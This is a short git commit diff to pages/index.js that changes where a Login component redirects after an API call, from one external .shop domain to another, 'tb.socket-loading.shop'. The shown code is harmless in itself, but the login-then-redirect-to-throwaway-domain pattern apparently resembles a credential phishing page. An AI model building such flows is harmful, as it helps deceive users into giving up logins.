d28971df02912361955af4370c0cd60bab672fc2
husknet <127146284+husknet@users.noreply.github.com>
2025-06-05 12:00:15 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://tb.ugobest.shop/';
+      window.location.href = 'https://tb.socket-loading.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
